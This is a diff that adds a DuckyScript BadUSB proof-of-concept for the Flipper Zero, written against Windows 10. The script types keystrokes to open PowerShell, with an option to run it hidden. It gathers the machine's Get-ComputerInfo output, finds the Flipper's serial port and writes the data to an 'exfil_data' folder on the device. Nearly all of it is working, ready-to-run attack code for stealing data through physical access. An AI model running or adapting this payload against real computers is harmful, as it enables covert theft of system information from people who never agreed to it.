@@ -1,0 +1,41 @@
+REM Title: Save To Flipper PoC
+REM Author: emptythevoid and LupusE
+REM Target: Windows 10 (not tested on Windows 11, yet)
+REM Version: 1.0
+REM Category: PoC
+
+REM Open Powershell
+DELAY 500
+GUI r
+DELAY 500
+
+REM Optionally run powershell hidden
+REM STRING powershell -w h
+
+REM Comment out the below line if you're using the optional hidden window above
+STRING powershell
+
+DELAY 500
+ENTER
+DELAY 750
+
+REM The powershell starts with a delay. This is to give you time to hit BACK twice on the Flipper to get it out of BadUSB mode. Otherwise it wont save data.
+REM If the normal FZ mode is detected, the script will determine which COM port the Flipper is plugged in and write a string to the specified path/file.
+
+REM ## Command to execute/data to extract. Don't forget cast to string. 
+ALTSTRING $d=(Get-ComputerInfo|Out-String);
+
+REM ## The VendorID and ProductID to search. If you'd change the BadUSB IDs in this script, you need to change $BHID as well.
+ALTSTRING $BHID="HID\\VID_046D\&PID_C529";
+ALTSTRING $SUSB="USB\\VID_0483\&PID_5740";
+REM Teh trorage Path where the result is SPATHed at the Flipper Zero SD card
+ALTSTRING $SPATH="/ext/apps_data/exfil_data"
+ENTER
+
+DELAY 1000
+REM ## Perform 600 loops, to check if BadUSB is still active, wait 1 sec. If the Flipper is just disconnected, the loop will wait 4 sec.
+ALTSTRING 1..600|%{Try{$p=New-Object System.IO.Ports.SerialPort("COM$(((Get-PNPDevice -PresentOnly|Where{$_.InstanceID -match $SUSB -and $_.Class -eq "Ports"}) -split "COM")[1][0])",115200,'None',8,'one');$p.open();$p.Write("storage write $SPATH `r`n");$p.Write($d);$p.Write("$([char] 3)");$p.Close();break}Catch{If(Get-PNPDevice -PresentOnly|Where {$_.InstanceID -match $BHID}){"BadUSB"}Else{"NoFZ";Start-Sleep 4};Start-Sleep 1}}
+REM ## Shorter Version, without debug output, no 4 Sec delay, exits powershell upon completion (useful when using powershell -w h)
+REM ALTSTRING 1..600|%{Try{$p=New-Object System.IO.Ports.SerialPort("COM$(((Get-PNPDevice -PresentOnly -Class 'Ports' -InstanceID 'USB\VID_0483&PID_5740*') -split "COM")[1][0])",115200,'None',8,'one');$p.open();$p.Write("storage write $SPATH `r`n");$p.Write($d);$p.Write("$([char] 3)");$p.Close();break}Catch{Sleep 1}};exit
+
+ENTER
